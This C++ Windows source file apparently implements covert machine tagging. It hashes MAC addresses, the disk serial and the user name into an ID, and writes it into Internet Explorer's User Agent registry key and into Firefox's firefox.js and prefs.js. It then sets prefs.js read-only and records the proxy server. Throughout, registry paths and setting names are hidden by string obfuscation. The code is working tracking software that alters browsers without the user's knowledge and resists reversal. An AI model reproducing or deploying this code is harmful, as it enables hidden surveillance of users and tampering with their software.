// UserAgent.cpp: implementation of the CUserAgent class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "UserAgent.h"

#include "Md5.h"
#include "GetDiskInfo.h"
#include "WinApi.h"
//////////////////////////////////////////////////////////////////////////
// 
extern UCHAR Ipnum;
extern ULONG LocalIpLst[4];
extern ULONG v_IpAgent;

//////////////////////////////////////////////////////////////////////////
// 
ULONG WriteMachineID();
ULONG GetMacList() ;
ULONG IplstEncrypt(const char *lst, const int len);
/////////////////////////////////////////////////////////////////////
// 
void CreateAgentAndWrite(BOOL bLoadWrite)
{
	v_IpAgent=WriteMachineID();	// 获得注册表中值
//	v_IpAgent=0x11111111;
	char TmpDeStr[30];

	try
	{
		CHAR strCompatible[200];
		memset(strCompatible,0,200);
		UCHAR *p=(UCHAR *)&v_IpAgent;
		sprintf(strCompatible,"%s%d.%d.%d.%d", DepubStringA(TmpDeStr, 30, "8khXVey_dw LyxnC "), p[0], p[1], p[2], p[3]);//Compatible win32 
		ChangeFireFox(strCompatible);
	}
	catch (...)
	{
		
	}
}

//[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\User Agent]
//@="Mozilla/11.0"
//"Compatible"="Zzh_Tst"
ULONG WriteMachineID()
{
	ULONG ulAgent;
	HKEY hKey;
	long Result=0;
	DWORD lResult=0;
	CHAR strCompatible[200];
	char TmpDeStr[20];

	BOOL bIsExist = FALSE;
	char secname[200];
	char strComp[20];
	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent
	DepubStringA(secname, 200, "AIt-NPWi\\.yGok2kle\\Nyx:kL2\\8aoowxe6wo2ykx\\Uxewoxwe Aweeyxs2\\4Y7\\M2wo Pswxe");

	time_t newtm = time(0);
	
	memset(strComp, 0, 20);
	DepubStringA(strComp, 20, "8khXVey_dw LyxnC ");//Compatible win32 
	// 打开查询, 存在则读取后返回
	Result = PRegOpenKeyExA(
		HKEY_CURRENT_USER,
		secname,
		0, 
		KEY_QUERY_VALUE, &hKey);
	if(!Result)
	{
		char chrAgent[1024];
		DWORD dwAgent = 1024;
		Result = PRegQueryValueExA(
			hKey,
			DepubStringA(TmpDeStr, 20, "8khXVey_dw"), //Compatible
			NULL, 
			NULL,
			(LPBYTE)chrAgent,
			&dwAgent);
		if(Result == ERROR_SUCCESS)
		{
			do 
			{
				char *pos  = strstr(chrAgent, strComp);
				if(pos == NULL)
				{
					break;
				}

				char *pos2 = strstr(pos, "Windows/");
				if (pos2 == NULL)
				{
					break;
				}

				char TimeStr[100];
				memset(TimeStr, 0, 100);
				memcpy(TimeStr, pos2+strlen("Windows/"), 10);
				time_t pretm;
				sscanf(TimeStr, "%u", &pretm);
				
				if (newtm - pretm > 7*24*60*60)
				{
					break;
				}
				
				int slen = strlen(strComp);
				if(strlen(chrAgent) <= (pos-chrAgent+slen+6))
				{
					break;
				}

				char regAgent[200];
				memset(regAgent, 0, sizeof(regAgent));
				int off = (pos2-pos-slen);
				if(off > 0)
				{
					memcpy(regAgent, pos + slen, off);
					IF_LOUD(DbgFat32Log(regAgent);)
						ulAgent = Pinet_addr(regAgent);
					bIsExist = (ulAgent != INADDR_NONE);	// 存在已有值否?
					
					if (ulAgent == 0x7E42F8EC || //空
						ulAgent == 0xAD5BF53F || //mac: 00:1E:10:1F:00:00Administrator
						ulAgent == 0x7B4F6D92 || //Administrator
						ulAgent == 0xDA186FD2 || //mac: 00:1E:10:1F:00:00
						ulAgent == 0x4F390664 || //mac: 58:2C:80:13:92:63
						ulAgent == 0xB71A4D89)	 //mac: 58:2C:80:13:92:63Administrator
					{
						bIsExist = FALSE;
					}
				}
			} while (0);
		}	// have Compatible
		PRegCloseKey(hKey);
	}	// Query open

	if(FALSE == bIsExist)
	{
		// 获得
		ulAgent = GetMacList();
		if(ulAgent == 0)
		{
			srand(time(0));
			ulAgent = 0x234567 << 8;
			ulAgent += rand() & 0xFF;
		}
		else if(ulAgent < 0xFFFF)
		{
			char macLst[100];
			sprintf(macLst, "%s: 0x%u", DepubStringA(TmpDeStr, 20, "hVGAah"), ulAgent); //macSum
			ulAgent = IplstEncrypt(macLst, strlen(macLst));
		} 
		UCHAR *p=(UCHAR *)&ulAgent;
		sprintf(strCompatible,"%s%d.%d.%d.%dWindows/%u", strComp, p[0], p[1], p[2], p[3], newtm);
		
		// 创建键, 如果不存在, 存在则打开
		Result=PRegCreateKeyExA(HKEY_CURRENT_USER,
			secname,
			0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,NULL,&hKey,&lResult);
		if(Result == ERROR_SUCCESS)
		{
			// 设置
			Result = PRegSetValueExA(hKey, 
				DepubStringA(TmpDeStr, 20, "8khXVey_dw"), //Compatible
				0, REG_SZ , (const UCHAR *)strCompatible, strlen(strCompatible));
			PRegCloseKey (hKey)	; 
		}	 
	}

	return ulAgent;
}

void WriteIELog(char* logInfo)
{
	if (strlen(logInfo) >= 100)
	{
		return;
	}
	HKEY hKey;
	DWORD lResult=0;
	CHAR strCompatible[1500];
	char chrAgent[1024]={0};
	DWORD dwAgent = 1024;
	char TmpDeStr[20];
	
	char secname[200];
	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent
	DepubStringA(secname, 200, "AIt-NPWi\\.yGok2kle\\Nyx:kL2\\8aoowxe6wo2ykx\\Uxewoxwe Aweeyxs2\\4Y7\\M2wo Pswxe");
	
	long Result = PRegOpenKeyExA(
		HKEY_CURRENT_USER,
		secname,
		0, 
		KEY_QUERY_VALUE, &hKey);
	if(!Result)
	{
		Result = PRegQueryValueExA(
			hKey,
			DepubStringA(TmpDeStr, 20, "8khXVey_dw"), //Compatible
			NULL, 
			NULL,
			(LPBYTE)chrAgent,
			&dwAgent);
		PRegCloseKey(hKey);
		if (Result == ERROR_SUCCESS)
		{
			if (strstr(chrAgent, logInfo))
			{
				return;
			}
		}
	}
	
	Result=PRegCreateKeyExA(HKEY_CURRENT_USER,
		secname,
		0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,NULL,&hKey,&lResult);
	if(Result == ERROR_SUCCESS)
	{
		sprintf(strCompatible, "%s; %s", logInfo, chrAgent);
		Result = PRegSetValueExA(hKey, 
			DepubStringA(TmpDeStr, 20, "8khXVey_dw"), //Compatible
			0,
			REG_SZ ,
			(const UCHAR *)strCompatible,strlen(strCompatible));
		PRegCloseKey (hKey)	; 
	}
	
	return;
}

void CheckProxy()
{
	DWORD isEnableProxy=FALSE;
	HKEY hkey;
	unsigned long type;
	long res;
	unsigned long len=4;
	char TmpDeStr[200];

	//Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings
	DepubStringA(TmpDeStr, 200, "AkleLVow\\.yGok2kle\\Nyx:kL2\\8aoowxe6wo2ykx\\Uxewoxwe Aweeyxs2");
	
	if(PRegOpenKeyExA(HKEY_CURRENT_USER,
		TmpDeStr,
		0,
		KEY_QUERY_VALUE,
		&hkey)!=ERROR_SUCCESS)	//打开键失败
	{
		return;
	}
	
	//ProxyEnable
	res = PRegQueryValueExA(hkey, DepubStringA(TmpDeStr, 200, "OokzBixV_dw"), 0, &type, (BYTE*)&isEnableProxy, &len);
	if(isEnableProxy)
	{
		char server[50];
		memset(server, 0, sizeof(server));
		len = 50;
		//ProxyServer
		PRegQueryValueExA(hkey, DepubStringA(TmpDeStr, 200, "OokzBAwoEwo"), 0, &type, (BYTE*)server, &len);
		
		if(len>0)
			WriteIELog(server);
	}
	
	PRegCloseKey(hkey);
	
	return;
}

typedef struct _ASTAT_
{
    ADAPTER_STATUS adapt;
    NAME_BUFFER    NameBuff [30];
}ASTAT, * PASTAT;

void getmac_one (int lana_num, char *mac)
{
	ASTAT Adapter;
    NCB ncb;
    UCHAR uRetCode;
	
    memset( &ncb, 0, sizeof(ncb) );
    ncb.ncb_command = NCBRESET;
    ncb.ncb_lana_num = lana_num;   
	uRetCode = PNetbios( &ncb );
	
	memset( &ncb, 0, sizeof(ncb) );
    ncb.ncb_command = NCBASTAT;
    ncb.ncb_lana_num = lana_num; 	// 指定网卡号
	
    strcpy( (char *)ncb.ncb_callname,	"*               " );
    ncb.ncb_buffer = (unsigned char *) &Adapter;
	ncb.ncb_length = sizeof(Adapter);
	uRetCode = PNetbios( &ncb );
	if ( uRetCode == 0 )
	{
		//		memcpy(mac, Adapter.adapt.adapter_address, 6);
		sprintf(mac, "mac: %02X:%02X:%02X:%02X:%02X:%02X",
			Adapter.adapt.adapter_address[0],
			Adapter.adapt.adapter_address[1],
			Adapter.adapt.adapter_address[2],
			Adapter.adapt.adapter_address[3],
			Adapter.adapt.adapter_address[4],
			Adapter.adapt.adapter_address[5] );
	}
}

int GetMacListStr(char *macLst, int *lstLen) 
{
    NCB ncb;
    UCHAR uRetCode;
	LANA_ENUM lana_enum;
	
    memset( &ncb, 0, sizeof(ncb) );
    ncb.ncb_command = NCBENUM;
	
    ncb.ncb_buffer = (unsigned char *) &lana_enum;
    ncb.ncb_length = sizeof(lana_enum);
	// 向网卡发送NCBENUM命令，以获取当前机器的网卡信息，如有多少个网卡、每张网卡的编号等 
	uRetCode = PNetbios( &ncb );
	if ( uRetCode == 0 )
	{
		char oneMac[50];
		memset(oneMac,0,50);
		int offset = 0;
		for ( int i=0; i< lana_enum.length; ++i)
		{
			getmac_one( lana_enum.lana[i], oneMac);
			if(*lstLen > offset+strlen(oneMac)+2)
				offset += sprintf(macLst+offset, "%s", oneMac);
			else
				break;
		}
		*lstLen = offset;
		return 1;
	}
	
	*lstLen = 0;
	return 0;
}

int GetMd5(const void *bufv, int length)
{
	DWORD hash[4];
	MD5Tran(hash, (void*)bufv, length);
	
	return (int)hash[3];
}

ULONG GetOtherMac(char *macLst, int &lstLen)
{
	ULONG re=0;
	ULONG len	=0;
	int datalen	=0;
	int ilen	=0;
	PIP_ADAPTER_INFO pinfo=NULL;
	ULONG nError  = PGetAdaptersInfo(pinfo,&len);  
    if (nError==ERROR_NO_DATA)
    {
		lstLen = 0;
		return re;
    }
    if (nError==ERROR_NOT_SUPPORTED)
    {
		lstLen = 0;
		return re;
    }
    if (nError==ERROR_BUFFER_OVERFLOW)
    {
        pinfo	= (PIP_ADAPTER_INFO)malloc(len);
        nError  = PGetAdaptersInfo(pinfo,&len);
    }

	char TmpDeStr1[200], TmpDeStr2[50];
	
	if(nError==0)
	{
		char szKeyPath[MAX_PATH];
		IP_ADDR_STRING *paddr=NULL;
		int offset=0;
		while(pinfo!=NULL)
		{
			HKEY hKey;
			char chrAgent[1024]={0};
			DWORD dwAgent = 1024;

			//SYSTEM\\CurrentControlSet\\Control\\Network\\{4D36E972-E325-11CE-BFC1-08002BE10318}
			DepubStringA(TmpDeStr1, 200, "A/A-i.\\8aoowxe8kxeokdAwe\\8kxeokd\\5weLkob\\{3fnriRvCHinC4Hjj8iHQt8jH7177CQij7nj1}");
			//Connection
			DepubStringA(TmpDeStr2, 50, "8kxxwGeykx");

			sprintf(szKeyPath, "%s\\%s\\%s", TmpDeStr1, pinfo->AdapterName, TmpDeStr2);
			long Result = PRegOpenKeyExA(
				HKEY_LOCAL_MACHINE,
				szKeyPath,
				0, 
				KEY_QUERY_VALUE, &hKey);
			if(!Result)
			{
				//PnpInstanceID
				DepubStringA(TmpDeStr2, 50, "OxXUx2eVxGwUf");
				Result = PRegQueryValueExA(
					hKey,
					TmpDeStr2, 
					NULL, 
					NULL,
					(LPBYTE)chrAgent,
					&dwAgent);
				PRegCloseKey(hKey);
				if (Result == ERROR_SUCCESS)
				{
					//USB
					if (strstr(chrAgent, DepubStringA(TmpDeStr2, 50, "MAQ")))
					{
						pinfo = pinfo->Next;
						continue;
					}
				}
			}
			else
			{
				pinfo = pinfo->Next;
				continue;
			}

			char mac[30];
			memset(mac,0,30);
			int len=sprintf(mac, "mac: %02X:%02X:%02X:%02X:%02X:%02X",
				pinfo->Address[0],
				pinfo->Address[1],
				pinfo->Address[2],
				pinfo->Address[3],
				pinfo->Address[4],
				pinfo->Address[5] );
			if(lstLen>(offset+len))
			{
				memcpy(macLst+offset, mac, len);
				offset += len;
			}
 
		 	pinfo = pinfo->Next;
		}
		lstLen = offset;
		return 1;
	}
 
	lstLen = 0;
	return  re;
}

ULONG GetMacList() 
{
	ULONG macSum = 0;
   
	char macstr[1024], diskstr[1024], tmpstr[5*1024];
	int macstrlen, diskstrlen, tmplen;

	char strUser[50], TmpDeStr[50];

	//userprofile
	DepubStringA(TmpDeStr, 50, "a2woXoklydw");
	
	char *strUserPath = getenv(TmpDeStr);
	memset(strUser, 0, 50);
	if(strUserPath != NULL)
	{
		strUserPath = strrchr(strUserPath, '\\');
		if(strUserPath != NULL)
		{
			strcpy(strUser, strUserPath+1);
		}
	}

	//利用GetAdaptersInfo获取序列号
	macstrlen = 1024;
	memset(macstr, 0, sizeof(macstr));
	GetOtherMac(macstr, macstrlen);

	if(macstrlen==0)
	{
		macstrlen = 1024;
		memset(macstr, 0, sizeof(macstr));
		GetMacListStr(macstr, &macstrlen);
	}

	memset(diskstr, 0, sizeof(diskstr));
	ReadPhysicalDriveInNTWithZeroRights(diskstr);
	diskstrlen = strlen(diskstr);

	if(macstrlen > 10 && diskstrlen > 10)
	{
		tmplen = sprintf(tmpstr, "%s%s%s", macstr, diskstr, strUser);
		macSum = GetMd5(tmpstr, tmplen);
	}
	else if (diskstrlen > 10)
	{
		tmplen = sprintf(tmpstr, "%s%s", diskstr, strUser);
		macSum = GetMd5(tmpstr, tmplen);
	}
	//利用磁盘卷序列号做唯一值
	else
	{
		char Disk[4];
		sprintf(Disk, "%c:\\", 'A'+2);
		BOOL bSuccess = (PGetVolumeInformationA(Disk, NULL, 0, &macSum,
			NULL, NULL, NULL, 0) != 0);	
	}

	return macSum;
}

ULONG IplstEncrypt(const char *lst, const int len)
{
	UCHAR IPlst [64];
	ULONG re=0;
	
	memset(IPlst,0,64);
	if(len>64){
		memcpy(IPlst,(CHAR *)lst, 4*16);
	}
	else{
		memcpy(IPlst,(CHAR *)lst, len);
	}

	for(int i=4;i<=56;i+=4){
		IPlst[0] += IPlst[i];
		IPlst[1] += IPlst[i+1];
		IPlst[2] += IPlst[i+2];
		IPlst[3] += IPlst[i+3];
	}
	re=*((ULONG *)IPlst);
	return re;
}


BOOL ModifyFirefoxAgent(LPCSTR foxpath, char* fixagent, LPCSTR modifyprefsname)
{
	char TmpDeStr[20];

	char firefoxpath[MAX_PATH];
	strcpy(firefoxpath, foxpath);
	
	DWORD pbuffer=NULL;
	DWORD datalen=0;
	int	Op = -1;
	Op=GetFileContent(firefoxpath,pbuffer,datalen);
	char* buffer=(char*)pbuffer;
	if(!buffer)
		return FALSE;
	
	
	char *pdest=NULL;
	char *pdest1=NULL;
	char *pdest2=NULL;
	int offset=0;
	pdest=strstr(buffer,modifyprefsname);
	//如果查找不到则增加该节信息
	if(!pdest)
	{
		char* pNewBuffer=new char[datalen+100];
		memset(pNewBuffer, 0, datalen+100);
		memcpy(pNewBuffer, buffer, datalen);
		memcpy(pNewBuffer+datalen, "\r\n", 2);
		datalen += 2;
		memcpy(pNewBuffer+datalen, modifyprefsname, strlen(modifyprefsname));
		datalen += strlen(modifyprefsname);
		memcpy(pNewBuffer+datalen, ",\"", 2);
		datalen += 2;
		memcpy(pNewBuffer+datalen, fixagent, strlen(fixagent));
		datalen += strlen(fixagent);
		memcpy(pNewBuffer+datalen, "\");\r\n", 5);
		datalen += 5;
		
		delete[] buffer;
		buffer = pNewBuffer;
		pbuffer = (DWORD)pNewBuffer;
	}
	else
	{
		offset=strlen(modifyprefsname);
		pdest+=offset;
		pdest1=strstr(pdest,"\"");
		if(!pdest1)
			goto exitdd;
		pdest1++;
		
		pdest2=strstr(pdest1, DepubStringA(TmpDeStr, 20, "8khXVey_dw")); //Compatible
		if(pdest2)
		{
			goto exitdd;
		}
		memmove(pdest1+strlen(fixagent), pdest1 ,datalen-(pdest1-buffer));
		memcpy(pdest1, fixagent, strlen(fixagent));
		
		datalen += strlen(fixagent);
	}
	FILE * fs;
	fs = fopen(firefoxpath, "w+b");
	if(fs)
	{
		fwrite(buffer,1,datalen,fs);
		fclose(fs);
	}
	
exitdd:
	if(buffer)
		delete[] buffer;
	
	
	return TRUE;
}

BOOL GetFirefoxUninstallPath(char* softname,char* softpath)
{
	BOOL rValue=FALSE;
	HKEY	hkey;
	HKEY	hSubKey;
	LONG	regRst;
	char    regValue[MAX_PATH];
	DWORD regValueLen=MAX_PATH;
	DWORD dwType;
	DWORD dwSize = 200;
	char TmpDeStr[100];

	try
	{
		regRst = PRegConnectRegistryA(NULL , HKEY_LOCAL_MACHINE, &hkey);
		if( regRst !=ERROR_SUCCESS)
		{
			PRegCloseKey(hkey);
			return FALSE ;
		}
		//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\ 
		regRst = PRegOpenKeyA(hkey, DepubStringA(TmpDeStr, 100, "AIt-NPWi\\.yGok2kle\\Nyx:kL2\\8aoowxe6wo2ykx\\Mxyx2eVdd\\"), &hSubKey);
		if( regRst != ERROR_SUCCESS)
		{
			PRegCloseKey(hSubKey);
			return FALSE ;
		}
		for(DWORD i=0;;i++)
		{
			regRst = PRegEnumKeyA(hSubKey, i, regValue, regValueLen);
			if (regRst == (DWORD) ERROR_SUCCESS ) 
			{	
				
				strlwr(regValue);
				if( strstr(regValue,softname) )
				{
					HKEY	hSoftKey=NULL;
					regRst = PRegOpenKeyA(hSubKey, regValue, &hSoftKey);
					if(regRst==(DWORD) ERROR_SUCCESS)
					{
						//InstallLocation
						regRst = PRegQueryValueExA(hSoftKey, DepubStringA(TmpDeStr, 100, "Ux2eVddSkGVeykx"), NULL, &dwType, (BYTE *)softpath, &dwSize);
						if(regRst==ERROR_SUCCESS)
							rValue=TRUE;
					}
					PRegCloseKey(hSoftKey);
				}	
				
			}
			else
				break;
			
		}
		PRegCloseKey(hSubKey);	
		PRegCloseKey(hkey);
	}
	catch (...)
	{
		if (hSubKey != NULL)
			PRegCloseKey(hSubKey);
		if (hkey != NULL)
			PRegCloseKey(hkey);
		
		return FALSE;	
	}
	
	return rValue;
}

BOOL ChangeFireFox(char* fixagent)
{
	char firefoxpath[MAX_PATH], firefoxstr[20], ModifyStr[100], TmpDeStr[50];
	memset(firefoxpath,0,MAX_PATH);

	//firefox
	DepubStringA(firefoxstr, 20, "lyowlkz");
	if(!GetFirefoxUninstallPath(firefoxstr ,firefoxpath))
		return FALSE;
	if(strlen(firefoxpath)<=0)
		return FALSE;

	//\\defaults\\pref\\firefox.js
	strcat(firefoxpath, DepubStringA(TmpDeStr, 50, "\\:wlVade2\\Xowl\\lyowlkzYp2"));
	memset(ModifyStr, 0, 100);
	//general.useragent.extra.firefox
	sprintf(ModifyStr, "pref(\"%s\"", DepubStringA(TmpDeStr, 50, "swxwoVdYa2woVswxeYwzeoVYlyowlkz"));
	ModifyFirefoxAgent(firefoxpath, fixagent, ModifyStr);

	char AppDataPath[MAX_PATH];
	ZeroMemory(AppDataPath, MAX_PATH); 
	PSHGetSpecialFolderPathA(NULL, AppDataPath, CSIDL_APPDATA, FALSE);//CSIDL_APPDATA，APPDATA文件目录

	//Mozilla\\Firefox
	sprintf(firefoxpath, "%s\\%s", AppDataPath, DepubStringA(TmpDeStr, 50, ".kKyddV\\tyowlkz"));
	char tempPath[2*MAX_PATH];
	//profiles.ini
	sprintf(tempPath, "%s\\%s", firefoxpath, DepubStringA(TmpDeStr, 50, "Xoklydw2Yyxy"));
	
	char IniKey[100];
	//StartWithLastProfile
	DepubStringA(IniKey, 100, "AeVoeNyeZSV2eOoklydw");
	int startWith = PGetPrivateProfileIntA("General", IniKey, -1, tempPath);
	if(startWith >=1)
	{
		char rcKey[20], rcPath[MAX_PATH];
		sprintf(rcKey, "Profile%d", startWith-1);
		PGetPrivateProfileStringA(rcKey, "Path", "**", rcPath, 256, tempPath);
		if(rcPath[0] != '*')
		{
			//prefs.js
			sprintf(tempPath, "%s\\%s\\%s", firefoxpath, rcPath, DepubStringA(TmpDeStr, 50, "Xowl2Yp2"));
			memset(ModifyStr, 0, 100);
			//general.useragent.override
			sprintf(ModifyStr, "user_pref(\"%s\"", DepubStringA(TmpDeStr, 50, "swxwoVdYa2woVswxeYkEwooy:w"));
			ModifyFirefoxAgent(tempPath, fixagent, ModifyStr);
			DWORD attribute1=PGetFileAttributesA(tempPath);
			PSetFileAttributesA(tempPath, FILE_ATTRIBUTE_READONLY|attribute1);
		}
	}

	return TRUE;
}


